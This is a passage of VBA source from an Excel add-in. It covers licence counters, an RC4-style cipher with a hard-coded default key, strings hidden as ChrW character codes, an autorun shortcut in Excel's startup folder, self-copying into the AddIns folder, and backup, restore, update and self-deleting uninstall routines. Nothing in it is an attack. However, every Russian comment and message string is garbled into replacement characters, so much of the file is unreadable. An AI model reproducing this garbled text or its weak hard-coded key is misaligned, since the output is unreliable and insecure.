    CTR_ = tb$ & Left(txt, 1) & tp & Mid(txt, InStrRev(txt, "."))
End Function
Public Function EnDeCrypt(ByVal txt$, Optional ByVal numeric As Boolean, Optional ByVal p$)        'As String
    On Error Resume Next
    Dim s(0 To 255) As Integer, kep(0 To 255) As Integer: If Len(p) = 0 Then p = "12345asdfg"
    Dim temp As Integer, a As Integer, b As Integer, sd As Long
    Dim i As Integer, j As Integer, temp2 As Integer, k As Integer
    b = 0
    For a = 0 To 255
        b = b + 1: If b > Len(p) Then b = 1
        kep(a) = Asc(Mid$(p, b, 1))
    Next a
    For a = 0 To 255: s(a) = a: Next a
    b = 0: For a = 0 To 255: b = (b + s(a) + kep(a)) Mod 256: temp = s(a): s(a) = s(b): s(b) = temp: Next a
    For a = 1 To Len(txt)
        i = (i + 1) Mod 256: j = (j + s(i)) Mod 256: temp = s(i): s(i) = s(j): s(j) = temp
        k = s((s(i) + s(j)) Mod 256)
        EnDeCrypt = EnDeCrypt & Chr(Asc(Mid$(txt, a, 1)) Xor k)
        sd = sd + (Asc(Mid$(txt, a, 1)) Xor k)
    Next
    If numeric Then EnDeCrypt = sd
End Function
Function CounterUpdate(ByVal Level&)
    On Error Resume Next
    If NoLicense Then WSP Level&, Val(RSP(Level&)) - 1
    Dim msg$
    If PL_(msg) Then
        MsgBox msg, vbCritical, ChrW(1044) & ChrW(1072) & ChrW(1083) & ChrW(1100) & ChrW(1085) & ChrW(1077) & _
                                ChrW(1081) & ChrW(1096) & ChrW(1077) & ChrW(1077) & ChrW(32) & ChrW(1080) & ChrW(1089) & ChrW(1087) & _
                                ChrW(1086) & ChrW(1083) & ChrW(1100) & ChrW(1079) & ChrW(1086) & ChrW(1074) & ChrW(1072) & ChrW(1085) & _
                                ChrW(1080) & ChrW(1077) & ChrW(32) & ChrW(1087) & ChrW(1088) & ChrW(1086) & ChrW(1075) & ChrW(1088) & _
                                ChrW(1072) & ChrW(1084) & ChrW(1084) & ChrW(1099) & ChrW(32) & ChrW(171) & PROJECT_NAME$ & ChrW(187) & _
                                ChrW(32) & ChrW(1085) & ChrW(1077) & ChrW(1074) & ChrW(1086) & ChrW(1079) & ChrW(1084) & ChrW(1086) & ChrW(1078) & ChrW(1085) & ChrW(1086) & ChrW(33)
        F_About.Show
        F_About.MultiPage1.Value = 1
        StopMacro = True
        Exit Function
    End If
End Function
Function BASE_REGISTRY_PATH$()
    BASE_REGISTRY_PATH$ = ChrW(72) & ChrW(75) & ChrW(67) & ChrW(85) & ChrW(92) & ChrW(83) & ChrW(111) & ChrW(102) & _
                          ChrW(116) & ChrW(119) & ChrW(97) & ChrW(114) & ChrW(101) & ChrW(92) & ChrW(69) & ChrW(120) & _
                          ChrW(99) & ChrW(101) & ChrW(108) & ChrW(86) & ChrW(66) & ChrW(65) & ChrW(92) & PROJECT_NAME$ & "\"
End Function
Function AutorunStatus() As Boolean
    ShortcutName$ = PROJECT_NAME$ & ".lnk"
    ShortcutFullName$ = Replace(Application.StartupPath & "\" & ShortcutName$, "\\", "\")
    AutorunStatus = Dir(ShortcutFullName$, vbNormal) <> ""
End Function
Sub showEULA(): On Error Resume Next: CreateObject("wscript.Shell").Run BREACH_EULA_HYPERLINK$: End Sub

Sub AddinAutoRun(Optional ByVal Disable As Boolean)
    On Error Resume Next
    If Not Disable Then
        If ThisWorkbook.Path Like Environ("temp") & "*" Then
            ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| TEMP

            AddinsFolder$ = Replace(Application.UserLibraryPath & "\", "\\", "\")
            ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| AddIns |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| C:\WINDOWS\Temp\
            If Dir(AddinsFolder$, vbDirectory) = "" Then AddinsFolder$ = Environ("temp") & "\"
            Application.DisplayAlerts = False
            ThisWorkbook.SaveAs AddinsFolder$ & ThisWorkbook.Name        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
            Application.DisplayAlerts = True
        End If
    End If

    ShortcutName$ = PROJECT_NAME$ & ".lnk"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, "MyAddin.lnk"
    ShortcutFullName$ = Replace(Application.StartupPath & "\" & ShortcutName$, "\\", "\")

    On Error Resume Next
    If Disable Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Disable=TRUE, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Kill ShortcutFullName$
    Else        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel
        Set AddinShortcut = CreateObject("WScript.Shell").CreateShortcut(ShortcutFullName$)
        AddinShortcut.TargetPath = ThisWorkbook.FullName
        AddinShortcut.Save
    End If

    Dim AI As AddIn
    For Each AI In Application.AddIns        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If AI.Name = ThisWorkbook.Name Then AI.Installed = False
    Next AI
End Sub


Sub SaveAddinToPermanentPath(Optional ByVal ForceSaving As Boolean)
    On Error Resume Next
    Dim SaveFileInAddinsFolder As Boolean
    AddinsFolder$ = Replace(Application.UserLibraryPath & "\", "\\", "\")
    If Dir(AddinsFolder$, vbDirectory) = "" Then Exit Sub        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|

    If Not ForceSaving Then
        If ThisWorkbook.Path Like Environ("temp") & "*" Then
            SaveFileInAddinsFolder = True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| Addins |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Else
            If ThisWorkbook.ReadOnly Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                Err.Clear
                SetAttr ThisWorkbook.FullName, vbNormal
                ThisWorkbook.ChangeFileAccess xlReadWrite

                If Err <> 0 Or ThisWorkbook.ReadOnly Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|-|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                    msg$ = "|fffd||fffd||fffd||fffd| |fffd|" & PROJECT_NAME$ & "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                           "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| """ & ThisWorkbook.Path & """" & vbNewLine & vbNewLine & _
                           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|" & PROJECT_NAME$ & "|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|Addins|fffd|?" & vbNewLine & _
                           "(|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|: """ & AddinsFolder$ & """)"
                    ttl$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
                    SaveFileInAddinsFolder = MsgBox(msg$, vbQuestion + vbOKCancel, ttl$) = vbOK
                End If
            End If
        End If
    End If

    If SaveFileInAddinsFolder Or ForceSaving Then
        OldFilename$ = ThisWorkbook.FullName: Err.Clear
        ThisWorkbook.SaveAs AddinsFolder$ & ThisWorkbook.Name
        If Dir(ThisWorkbook.FullName, vbNormal) <> "" Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            SetAttr OldFilename$, vbNormal
            Kill OldFilename$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        End If
    End If
End Sub

Function UninstallThisFile()
    On Error Resume Next
    msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & PROJECT_NAME$ & "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & vbNewLine & _
           "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & PROJECT_NAME$ & "|fffd|?"
    If MsgBox(msg$, vbExclamation + vbOKCancel + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & PROJECT_NAME$ & "|fffd|") = vbCancel Then Exit Function
    AddinAutoRun True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Application.DisplayAlerts = False
    FilePath$ = ThisWorkbook.FullName
    ThisWorkbook.ChangeFileAccess xlReadOnly
    SetAttr FilePath$, vbNormal

    Kill FilePath$
    If DEBUG_MODE Then Debug.Print Now, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & FilePath$
    ND "uninstall", "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbLf & CountersCurrentValues
    CreateObject("wscript.Shell").Run UNINSTALL_HYPERLINK$
    Application.DisplayAlerts = True
    ThisWorkbook.Close False
End Function

' ================================= MODULE updates ======================================================
Function BackupThisFile(Optional ByVal HideMessage As Boolean) As String
    On Error Resume Next
    Dim pi As New ProgressIndicator
    pi.ShowTime = False: pi.ShowPercents = False: pi.CancelButton.Visible = False
    If Not HideMessage Then pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    pi.StartNewAction 5, 50, IIf(HideMessage, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", ""), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    If TrueDeveloper Then If Not ThisWorkbook.Saved Then ThisWorkbook.Save
    pi.StartNewAction 0, 0, IIf(HideMessage, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", ""), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    BackupFolderPath$ = Environ("TEMP") & "\Backups\": MkDir BackupFolderPath$: Err.Clear
    If TrueDeveloper Then BackupFolderPath$ = "D:\|fffd||fffd||fffd||fffd||fffd||fffd||fffd|\Addin Backups\": MkDir BackupFolderPath$: Err.Clear
    backupPath$ = BackupFolderPath$ & "Backup " & Format(Now, "YYYY-MM-DD--HH-NN-SS ") & ThisWorkbook.Name
    If TrueDeveloper Then backupPath$ = BackupFolderPath$ & PROJECT_NAME$ & Format(Now, " YYYY-MM-DD--HH-NN-SS.") & Extension(ThisWorkbook.Name)
    ThisWorkbook.SaveCopyAs backupPath$
    BackupThisFile = IIf(Err, "", backupPath$)
    pi.StartNewAction 100, 100, " ": DoEvents

    PrevBackup$ = GetSetting(PROJECT_NAME$, "Setup", "LastBackup", "")
    SaveSetting PROJECT_NAME$, "Setup", "PrevBackup", PrevBackup$
    SaveSetting PROJECT_NAME$, "Setup", "LastBackup", backupPath$
    pi.Hide: DoEvents
    If HideMessage Then Exit Function
    If BackupThisFile = "" Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & _
               vbNewLine & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| " & backupPath$ & vbNewLine & vbNewLine
        MsgBox msg, vbExclamation, "|fffd||fffd||fffd|, |fffd||fffd||fffd|-|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|...":
        ND "backup error", msg
        Exit Function
    Else        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & _
               vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|: " & vbNewLine & backupPath$ & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & _
               FileOrFolderSize(FileLen(backupPath$)) & vbNewLine & vbNewLine, _
               vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|": Exit Function
    End If
End Function

Function RestoreLastBackup()
    On Error Resume Next
    LastBackupPath$ = GetSetting(PROJECT_NAME$, "Setup", "LastBackup", "")
    If Trim(LastBackupPath$) = "" Then
        msg = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
              "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
              "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        MsgBox msg, vbExclamation, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        Exit Function
    End If

    If Dir(LastBackupPath$, vbNormal) = "" Then
        msg = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
              LastBackupPath$ & vbNewLine & vbNewLine & _
              "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|?"
        If MsgBox(msg, vbExclamation + vbYesNo, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|") = vbYes Then
            PrevBackup$ = GetSetting(PROJECT_NAME$, "Setup", "PrevBackup", "")
            SaveSetting PROJECT_NAME$, "Setup", "PrevBackup", ""
            SaveSetting PROJECT_NAME$, "Setup", "LastBackup", PrevBackup$
        End If
        Exit Function
    End If

    msg = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & LastBackupPath$ & vbNewLine & _
          "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & FileOrFolderSize(FileLen(LastBackupPath$)) & vbNewLine & _
          vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|?"
    If MsgBox(msg, vbQuestion + vbOKCancel + vbDefaultButton2, _
              "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|") = vbCancel Then Exit Function

    PrevBackup$ = GetSetting(PROJECT_NAME$, "Setup", "PrevBackup", "")
    SaveSetting PROJECT_NAME$, "Setup", "PrevBackup", ""
    SaveSetting PROJECT_NAME$, "Setup", "LastBackup", PrevBackup$

    If DEBUG_MODE Then Debug.Print Now, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & LastBackupPath$
    SwitchToAnotherFile LastBackupPath$, True
End Function

Sub SwitchToAnotherFile(ByVal NewFilePath$, Optional ByVal CancelBackup As Boolean, _
                        Optional ByVal ReplaceGreenWorksheets As Boolean, Optional pi As ProgressIndicator)
    On Error Resume Next
    If ThisWorkbook.Path = "" Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|", vbExclamation, _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|!":
        ND "update failed", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|!" & vbLf & CountersCurrentValues
        Exit Sub
    End If
    On Error Resume Next
    pi.StartNewAction 40, 55, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...", "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"


    calc = Application.Calculation
    Application.Calculation = xlCalculationManual
    If Not CancelBackup Then
        backupPath$ = BackupThisFile(True)
        If backupPath$ = "" Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            pi.Hide: DoEvents: Application.ScreenUpdating = True
            msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & _
                   vbNewLine & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| " & backupPath$ & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
            MsgBox msg$, vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!":
            ND "update failed", msg$ & vbLf & CountersCurrentValues
            Exit Sub
        End If
    End If

    OldFilePath$ = ThisWorkbook.FullName
    Application.ScreenUpdating = False: Application.DisplayAlerts = False

    BackupFolderPath$ = Environ("TEMP") & "\Backups\": MkDir BackupFolderPath$: Err.Clear
    tempPath$ = BackupFolderPath$ & "before update " & PROJECT_NAME$ & " " & Format(Now, "YYYY-MM-DD--HH-NN-SS ") & ThisWorkbook.Name
    pi.StartNewAction 55, 75, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...", " "
    ThisWorkbook.SaveAs tempPath$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|

    pi.StartNewAction 75, 80, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| ...", " "
    SetAttr OldFilePath$, vbNormal
    Kill OldFilePath$
    FileCopy NewFilePath$, OldFilePath$

    Application.EnableEvents = False
    Dim NewVersionWB As Workbook: Set NewVersionWB = Workbooks.Open(OldFilePath$)

    pi.StartNewAction 80, 100, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...", " "
    If ReplaceGreenWorksheets Then UpdateWorksheets NewVersionWB, ThisWorkbook
    If Not NewVersionWB.Saved Then NewVersionWB.Save

